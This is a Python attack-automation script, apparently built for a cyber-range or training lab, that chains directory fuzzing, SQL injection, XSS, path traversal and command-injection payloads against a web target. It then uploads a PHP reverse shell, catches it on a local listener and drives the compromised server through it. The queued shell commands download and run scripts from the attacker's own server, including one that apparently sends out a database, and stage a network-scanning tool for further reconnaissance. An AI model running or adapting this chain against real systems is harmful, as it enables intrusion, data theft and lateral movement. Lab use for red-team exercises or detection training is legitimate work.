import requests
import socket
import threading
import time
import os
import random
import string
import urllib.parse

def upload_reverse_shell(target_base_url, file_name, file_path):
    """
    Upload reverse shell to the target server's upload.php endpoint.
    
    Args:
        target_base_url: Base URL (e.g., "http://www.secureskies.com")
        file_path: Path to reverse shell file
    
    Returns:
        tuple: (success: bool, uploaded_path: str)
    """
    upload_url = f"{target_base_url}/upload.php"
    
    print(f"[*] Uploading {os.path.basename(file_path)} to {upload_url}...")
    
    if not os.path.exists(file_path):
        print(f"[-] Error: File not found: {file_path}")
        return False, None
    
    try:
        with open(file_path, 'rb') as f:
            files = {'receipt': (os.path.basename(file_path), f, 'application/octet-stream')}
            response = requests.post(upload_url, files=files, timeout=30, allow_redirects=True)
            
            # Extract the uploaded file path from response
            uploaded_path = None
            if response.status_code == 200 and 'uploads/' in response.text:
                import re
                match = re.search(file_name, response.text)
                if match:
                    uploaded_path = "uploads/" + file_name
            
            if response.status_code == 200 and (os.path.basename(file_path) in response.text):
                print(f"[+] File uploaded successfully!")
                return True, uploaded_path
            else:
                print(f"[-] Upload failed with status code: {response.status_code}")
                return False, None
                
    except requests.exceptions.RequestException as e:
        print(f"[-] Upload error: {e}")
        return False, None
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return False, None


def handle_connection(client_socket, commands_to_execute):
    """
    Handle reverse shell connection and execute commands automatically.
    Returns a dictionary with command outputs.
    """
    print("Reverse shell connected! Executing commands...")
    results = {}
    captured_url = None  # Store the URL from nc_upload_share.py
    
    try:
        client_socket.settimeout(30)
        
        # Read initial connection message
        initial = client_socket.recv(4096).decode('utf-8', errors='ignore')
        
        # Execute each command and wait for completion
        for idx, command in enumerate(commands_to_execute, 1):
            # Check if this command needs URL substitution
            if "{NEXTCLOUD_URL}" in command and captured_url:
                command = command.replace("{NEXTCLOUD_URL}", captured_url)
                print(f"[{idx}/{len(commands_to_execute)}] {command} (URL substituted)")
            else:
                print(f"[{idx}/{len(commands_to_execute)}] {command}")
            
            # Send command with end marker
            client_socket.send((command + "; echo '<<<CMD_DONE>>>'\n").encode('utf-8'))
            
            # Determine timeout based on command type
            if './nmap' in command:
                initial_wait = 120  # Extra time for nmap to start
                read_timeout = 120  # Longer timeout for nmap scans
            elif 'mail_test.py' in command:
                initial_wait = 5  # Give mail script time to start
                read_timeout = 120  # Longer timeout for mail operations (2 minutes)
            elif 'tar' in command or 'wget' in command:
                initial_wait = 3
                read_timeout = 30
            else:
                initial_wait = 1
                read_timeout = 10
            
            time.sleep(initial_wait)
            
            # Receive response until we see the completion marker
            output = ""
            client_socket.settimeout(read_timeout)
            
            try:
                while True:
                    chunk = client_socket.recv(4096).decode('utf-8', errors='ignore')
                    if not chunk:
                        break
                    output += chunk
                    
                    # Check if we've received the completion marker
                    if '<<<CMD_DONE>>>' in output:
                        # Remove the marker from output
                        output = output.replace('<<<CMD_DONE>>>', '').strip()
                        break
                    
                    # If buffer is full, keep reading
                    if len(chunk) == 4096:
                        continue
                    
                    # Small wait to see if more data is coming
                    time.sleep(0.5)
                    try:
                        client_socket.settimeout(2.0)
                        more = client_socket.recv(4096).decode('utf-8', errors='ignore')
                        if more:
                            output += more
                            if '<<<CMD_DONE>>>' in more:
                                output = output.replace('<<<CMD_DONE>>>', '').strip()
                                break
                        else:
                            break
                    except socket.timeout:
                        break
                        
            except socket.timeout:
                print(f"[!] Timeout after {read_timeout}s")
            
            results[command] = output.strip()
            
            # Check if this is the nc_upload_share.py command and capture URL
            if "python3 nc_upload_share.py" in command and output:
                # Extract URL from output (looking for https:// URLs)
                import re
                url_match = re.search(r'https://[^\s]+', output)
                if url_match:
                    captured_url = url_match.group(0)
                    print(f"[*] Captured Nextcloud URL: {captured_url}")
            
            # Print command output
            if output:
                print(f"[OUTPUT]\n{output}\n")
            else:
                print("[OUTPUT] (no output)\n")
        
        client_socket.send(b"exit\n")
        
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        client_socket.close()
    
    return results

def execute_command(command):
    import subprocess
    result = subprocess.getoutput(command)
    return result

def start_server(commands_to_execute, results_dict, event):
    """
    Start listener and wait for reverse shell connection.
    Execute commands and store results.
    """
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(('0.0.0.0', 4444))
    server_socket.listen(1)
    server_socket.settimeout(60)  # 60 second timeout for connection
    
    print("[+] Server listening on port 4444...")
    
    try:
        client_socket, addr = server_socket.accept()
        print(f"[+] Connection from {addr}")
        
        # Execute commands and get results
        results = handle_connection(client_socket, commands_to_execute)
        results_dict.update(results)
        
    except socket.timeout:
        print("[-] Timeout waiting for reverse shell connection")
    except Exception as e:
        print(f"[-] Server error: {e}")
    finally:
        server_socket.close()
        event.set()  # Signal that we're done

# === CONFIG ===
TARGET_BASE = "http://www.secureskies.com"
WORDLIST = ['admin', 'login', 'config', 'backup', 'test', 'dev', 'phpinfo', 'index', 'home', 'upload', 'file', 'shell', 'web', 'app', 'api', 'status', 'health', 'info']
SQLI_PAYLOADS = ["' OR '1'='1", "' OR 1=1--", "1' UNION SELECT 1,2,3--", "' OR SLEEP(5)--"]
XSS_PAYLOADS = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"'><script>alert(1)</script>"]
LFI_PAYLOADS = ["../../../../etc/passwd", "../../windows/win.ini", "/proc/version"]
CMD_INJ_PAYLOADS = [";id", "|whoami", "&&cat /etc/passwd", ";ls"]

# === Simulate Directory Scan + Follow-up Attacks ===
def run_gobuster(target_url, wordlist_path=None):
    """
    Run gobuster directory fuzzing on target URL.
    Waits for completion before returning.
    """
    import subprocess
    
    print("[+] Starting gobuster directory fuzzing...")
    
    # Use Kali's built-in wordlists if not provided
    if not wordlist_path:
        # Try common Kali wordlist locations in order of preference
        kali_wordlists = [
            '/usr/share/wordlists/dirb/common.txt',
            # '/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt',
            # '/usr/share/seclists/Discovery/Web-Content/common.txt',
            # '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt',
            # '/usr/share/wordlists/wfuzz/general/common.txt',
        ]
        
        # Find first available wordlist
        for wl in kali_wordlists:
            if os.path.exists(wl):
                wordlist_path = wl
                print(f"[*] Using wordlist: {wordlist_path}")
                break
        
        # Fallback if no Kali wordlist found
        if not wordlist_path or not os.path.exists(wordlist_path):
            print("[!] No Kali wordlist found, creating minimal wordlist...")
            wordlist_path = "/tmp/simple_wordlist.txt"
            words = ['admin', 'login', 'config', 'backup', 'upload', 'uploads', 
                     'files', 'index', 'home', 'about', 'contact', 'api', 'dashboard']
            with open(wordlist_path, 'w') as f:
                for word in words:
                    f.write(word + '\n')
            print(f"[*] Created fallback wordlist with {len(words)} entries")
    
    # Run gobuster
    cmd = [
        'gobuster', 'dir',
        '-u', target_url,
        '-w', wordlist_path,
        '-x', 'php,html,txt',
        '-q',  # Quiet mode
        '-t', '20',  # 20 threads
        '--timeout', '10s',
        '--no-error'
    ]
    
    print(f"[*] Running: gobuster dir -u {target_url} -w {wordlist_path} -x php,html,txt")
    print("[*] Please wait for gobuster to complete...\n")
    
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=300  # 5 minute timeout
        )
        
        if result.returncode == 0:
            print("[+] Gobuster completed successfully\n")
            if result.stdout:
                print(result.stdout)
        else:
            print(f"[!] Gobuster finished with warnings\n")
            if result.stdout:
                print(result.stdout)
        
        return True
        
    except subprocess.TimeoutExpired:
        print("[!] Gobuster timeout after 5 minutes")
        return False
    except FileNotFoundError:
        print("[-] Gobuster not found. Please install: sudo apt install gobuster")
        return False
    except Exception as e:
        print(f"[-] Gobuster error: {e}")
        return False


def simulate_pentest_traffic():
    print("[+] Starting pentest traffic simulation...")
    session = requests.Session()
    
    # 1. Directory Brute-Force
    for word in WORDLIST:
        url = f"{TARGET_BASE}/{word}.php"
        try:
            r = session.get(url, timeout=3)
            
            # If 200 OK → EXPLOIT FURTHER
            if r.status_code == 200:
                print(f"[+] Found: {url}")
                
                # Extra GET requests (simulate crawling)
                for _ in range(3):
                    session.get(url, timeout=2)
                
                # SQLi on ?id= or ?page=
                for payload in SQLI_PAYLOADS:
                    sqli_url = f"{url}?id={urllib.parse.quote(payload)}"
                    session.get(sqli_url, timeout=2)
                
                # XSS
                for payload in XSS_PAYLOADS:
                    xss_url = f"{url}?q={urllib.parse.quote(payload)}"
                    session.get(xss_url, timeout=2)
                
                # LFI
                for payload in LFI_PAYLOADS:
                    lfi_url = f"{url}?file={urllib.parse.quote(payload)}"
                    session.get(lfi_url, timeout=2)
                
                # Command Injection
                for payload in CMD_INJ_PAYLOADS:
                    cmd_url = f"{url}?cmd={urllib.parse.quote(payload)}"
                    session.get(cmd_url, timeout=2)
                    
        except:
            pass  # Silent fail for stealth
        
        time.sleep(random.uniform(0.1, 0.7))  # Random delay

    # 2. Simulate random probing on index
    index_url = f"{TARGET_BASE}/index.php"
    for _ in range(10):
        param = ''.join(random.choices(string.ascii_letters + string.digits, k=5))
        session.get(f"{index_url}?{param}=1", timeout=2)
        time.sleep(0.2)

    print("[+] Pentest simulation complete")

# def send_file_via_netcat(target_ip, target_port, filepath):
#     """Send file to target using netcat"""
#     import subprocess
#     print(f"[*] Sending file via netcat to {target_ip}:{target_port}...")
#     try:
#         time.sleep(5)
#         cmd = f"nc {target_ip} {target_port} < {filepath}"
#         result = subprocess.run(cmd, shell=True, capture_output=True, timeout=60)
#         if result.returncode == 0:
#             print(f"[+] File sent successfully")
#         else:
#             print(f"[-] File transfer failed")
#         return result.returncode == 0
#     except Exception as e:
#         print(f"[-] Error: {e}")
#         return False

def execute_reverse_shell_attack(target_url, commands, send_file_callback=None):
    """
    Main function to execute reverse shell attack:
    1. Start listener
    2. Trigger reverse shell
    3. Execute commands
    4. Return results
    """
    print("\n" + "="*60)
    print("[+] REVERSE SHELL ATTACK SEQUENCE")
    print("="*60)
    
    # Prepare shared data structures
    results_dict = {}
    completion_event = threading.Event()
    
    # Start the listener in a thread
    print("[*] Starting listener on port 4444...")
    server_thread = threading.Thread(
        target=start_server,
        args=(commands, results_dict, completion_event)
    )
    server_thread.daemon = True
    server_thread.start()
    
    # Wait for listener to be ready
    time.sleep(2)
    
    # Trigger the reverse shell
    print(f"[*] Triggering reverse shell at {target_url}...")
    try:
        response = requests.get(target_url, timeout=3)
    except requests.exceptions.Timeout:
        print("[+] Shell triggered (timeout expected)")
    except requests.exceptions.RequestException as e:
        print(f"[-] Request error: {e}")
        exit()
    
    # If there's a file transfer callback, execute it
    if send_file_callback:
        print("[*] Initiating file transfer...")
        file_thread = threading.Thread(target=send_file_callback)
        file_thread.daemon = True
        file_thread.start()
    
    # Wait for command execution to complete
    print("[*] Executing commands...")
    completion_event.wait()
    
    print("[+] Command execution complete")
    print("="*60)
    
    return results_dict


def start_http_server(port=8000):
    """Start a simple HTTP server in the current directory"""
    import http.server
    import socketserver
    import os
    
    os.chdir('/home/student/Desktop')
    Handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer(("", port), Handler)
    print(f"[*] HTTP Server started on port {port}")
    httpd.serve_forever()

if __name__ == "__main__":
    # Configuration
    TARGET_BASE = "http://www.secureskies.com"
    FILE_NAME = "reverse6.php"
    REVERSE_SHELL_PATH = "/home/student/Desktop/attacker_flow/" + FILE_NAME
    
    TARGET_URL = f"{TARGET_BASE}/uploads/{os.path.basename(REVERSE_SHELL_PATH)}"
    ATTACKER_IP = "12.0.0.45"  # This machine's IP for HTTP server
    HTTP_PORT = 8000
    
    
    # Start HTTP server in background thread
    print(f"[*] Starting HTTP server on port {HTTP_PORT}...")
    http_thread = threading.Thread(target=start_http_server, args=(HTTP_PORT,))
    http_thread.daemon = True
    http_thread.start()
    time.sleep(3)
    
    # Verify HTTP server is running
    try:
        test_response = requests.get(f"http://{ATTACKER_IP}:{HTTP_PORT}/", timeout=5)
        print(f"[+] HTTP server running")
    except Exception as e:
        print(f"[!] Warning: HTTP server verification failed")
        time.sleep(2)
    
    # === NETWORK ENUMERATION WITH NMAP ===

    COMMANDS = [
        # Step 1: Get basic system info (as www-data first)
        "pwd",
        "ls",
        "whoami",
        "hostname",
        "uname -a",
        "cd /var/www/secureskies/secureskies",
        "ls",
        "cat custom_upload_cms_script.py",
        
        # Step 2c: Download send_db.py script
        (f"wget -T 60 -t 5 --no-check-certificate http://{ATTACKER_IP}:{HTTP_PORT}/attacker_flow/send_db.py -O send_db.py 2>&1"),
        # Step 2d: Verify download
        "ls -lh /var/www/secureskies/secureskies/send_db.py",
        
        # Step 2e: Make it executable
        "chmod +x /var/www/secureskies/secureskies/send_db.py",
        
        # Step 2f: Execute send_db.py in background (as student for logging)
        ("cd /var/www/secureskies/secureskies && nohup python3 send_db.py > /tmp/send_db.log 2>&1 & echo 'send_db.py started in background'"),
        
        # Step 2g: Verify the process is running
        "ps aux | grep send_db.py | grep -v grep",
        
        # # Step 3: Check if nmap is installed
        "which nmap",
        
        # # Step 4: Check if we have writable temp directory
        "mkdir -p /tmp/nmap_transfer && cd /tmp/nmap_transfer && pwd",
        
        # Step 5: Remove old nmap archive if exists
        "rm -f /tmp/nmap_transfer/nmap.tar.gz /tmp/nmap_transfer/nmap-x64 -rf",
        
        # Step 5b: Test connectivity to attacker's HTTP server
        f"curl -I http://{ATTACKER_IP}:{HTTP_PORT}/ 2>&1 || wget --spider http://{ATTACKER_IP}:{HTTP_PORT}/ 2>&1",
        
        # # Step 6: Download nmap archive from attacker machine using wget
        f"cd /tmp/nmap_transfer && wget -T 60 -t 5 --no-check-certificate -c http://{ATTACKER_IP}:{HTTP_PORT}/nmap-x64.tar.gz -O nmap.tar.gz 2>&1",
        
        # # Step 7: Wait for file system sync
        "sync && sleep 1",
        
        # Step 8: Verify download
        "ls -lh /tmp/nmap_transfer/nmap.tar.gz",
        
        # Step 9: Verify download - check size and file type
        "file /tmp/nmap_transfer/nmap.tar.gz",
        "du -h /tmp/nmap_transfer/nmap.tar.gz",
        
        # Step 10: Test gzip integrity before extraction
        "gzip -t /tmp/nmap_transfer/nmap.tar.gz 2>&1 && echo 'gzip file is valid' || echo 'ERROR: gzip file is corrupted'",
        
        # Step 11: Extract the tar.gz archive to nmap-x64 directory
        "cd /tmp/nmap_transfer && mkdir -p nmap-x64 && tar -xzvf nmap.tar.gz -C nmap-x64 2>&1",
        
        # Step 12: Verify extraction - check what was extracted
        "ls -la /tmp/nmap_transfer/",
        
        # Step 13: Check if nmap-x64 directory exists after extraction
        "test -d /tmp/nmap_transfer/nmap-x64 && echo 'SUCCESS: nmap-x64 directory exists' || echo 'ERROR: nmap-x64 directory NOT found'",
        
        # Step 14: Only proceed if directory exists - list contents
        "if [ -d /tmp/nmap_transfer/nmap-x64 ]; then ls -la /tmp/nmap_transfer/nmap-x64/; else echo 'Cannot list - directory does not exist'; fi",
        
        # Step 15: Make nmap executable (only if files exist)
        "if [ -f /tmp/nmap_transfer/nmap-x64/nmap ]; then chmod +x /tmp/nmap_transfer/nmap-x64/nmap && echo 'nmap made executable'; else echo 'nmap not found'; fi",
        # "if [ -f /tmp/nmap_transfer/nmap-x64/nmap ]; then chmod +x /tmp/nmap_transfer/nmap-x64/nmap && echo 'nmap made executable'; else echo 'nmap not found'; fi",
        
        # Step 16: Verify permissions
        "if [ -f /tmp/nmap_transfer/nmap-x64/nmap ]; then ls -l /tmp/nmap_transfer/nmap-x64/nmap; fi",
        # "if [ -f /tmp/nmap_transfer/nmap-x64/nmap ]; then ls -l /tmp/nmap_transfer/nmap-x64/nmap; fi",
    ]
    
    # Step 17: Run nmap scans (reduced to essential scans only)
    COMMANDS.extend([
        # Step 17a: Run nmap on localhost
        # "if [ -d /tmp/nmap_transfer/nmap-x64 ] && [ -f /tmp/nmap_transfer/nmap-x64/nmap ]; then cd /tmp/nmap_transfer/nmap-x64 && pwd && ./nmap -sV 192.168.20.0/24 -vv 2>&1; else echo 'ERROR: Cannot run nmap - files not found'; fi",
    
        # Step 17a-1: Download nc_upload_share.py script
        f"cd /tmp/nmap_transfer && wget -T 60 -t 5 --no-check-certificate http://{ATTACKER_IP}:{HTTP_PORT}/attacker_flow/nc_upload_share.py -O nc_upload_share.py 2>&1",
        
        # Step 17a-2: Verify download
        "ls -lh /tmp/nmap_transfer/nc_upload_share.py",

        # Step 17a-3: Download dphelper_v2.4_test_build script
        f"cd /tmp/nmap_transfer && wget -T 60 -t 5 --no-check-certificate http://{ATTACKER_IP}:{HTTP_PORT}/attacker_flow/dphelper_v2.4_test_build -O dphelper_v2.4_test_build 2>&1",
        
        # Step 17a-4: Verify download of dphelper_v2.4_test_build
        "ls -lh /tmp/nmap_transfer/dphelper_v2.4_test_build",
        
        # Step 17a-5: Make nc_upload_share executable
        "chmod +x /tmp/nmap_transfer/nc_upload_share.py",
        
        # Step 17a-6: Check if python3 is available
        "which python3",
        
        # Step 17a-7: Execute the script and capture output
        "cd /tmp/nmap_transfer && python3 nc_upload_share.py 2>&1",
        
        # Step 17a-8: Download mail_test.py script
        f"cd /tmp/nmap_transfer && wget -T 60 -t 5 --no-check-certificate http://{ATTACKER_IP}:{HTTP_PORT}/attacker_flow/mail_test.py -O mail_test.py 2>&1",
        
        # Step 17a-9: Verify download of mail_test.py
        "ls -lh /tmp/nmap_transfer/mail_test.py",
        
        # Step 17a-10: Make it executable
        "chmod +x /tmp/nmap_transfer/mail_test.py",

        
        
        # Step 17a-11: Execute mail_test.py with captured URL as parameter
        "cd /tmp/nmap_transfer && python3 mail_test.py '{NEXTCLOUD_URL}' 2>&1",
        # Step 18: Show network configuration for reference
        # "ip -4 addr show | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}/\\d+'",
        
        
        # # Step 19: Network neighbors and ARP cache
        # "ip neigh show",
        
        # # Step 20: Active connections
        # "netstat -antup 2>&1 || ss -antup",
        
        # # Step 21: Listening services
        # "netstat -lntp 2>&1 || ss -lntp",
        
        # Step 22: Cleanup (optional)
        # "rm -rf /tmp/nmap_transfer",
    ])
    
    # === Step 1: Run gobuster directory fuzzing ===
    print("\n" + "="*60)
    print("[PHASE 1] DIRECTORY FUZZING WITH GOBUSTER")
    print("="*60)
    run_gobuster(TARGET_BASE)
    
    print("\n[*] Waiting 3 seconds before pentest traffic simulation...")
    time.sleep(3)
    
    # === Step 2: Run pentest traffic simulation ===
    print("\n" + "="*60)
    print("[PHASE 2] PENTEST TRAFFIC SIMULATION")
    print("="*60)
    simulate_pentest_traffic()
    
    # time.sleep(5)
    
    # === Step 3: Upload reverse shell ===
    print("\n" + "="*60)
    print("[PHASE 3] UPLOADING REVERSE SHELL")
    print("="*60)
    
    success, uploaded_path = upload_reverse_shell(TARGET_BASE, FILE_NAME, REVERSE_SHELL_PATH)
    
    if success and uploaded_path:
        TARGET_URL = f"{TARGET_BASE}/{uploaded_path}"
        print(f"[+] File accessible at: {TARGET_URL}")
    elif success:
        print(f"[+] File should be at: {TARGET_URL}")
    else:
        print("[-] Upload failed - continuing anyway...")
    
    time.sleep(3)
    
    # === Step 4: Execute reverse shell attack ===
    print("\n" + "="*60)
    print("[PHASE 4] REVERSE SHELL ATTACK & ENUMERATION")
    print("="*60)
    results = execute_reverse_shell_attack(TARGET_URL, COMMANDS)
    
    
    # Display results
    print("\n" + "="*60)
    print("COMMAND EXECUTION RESULTS")
    print("="*60)
    for cmd, output in results.items():
        print(f"\n[CMD] {cmd}")
        print("-" * 60)
        print(output if output else "[No output]")
        print()
    
    print("="*60)
    print("[+] Attack sequence completed")
    print("="*60)





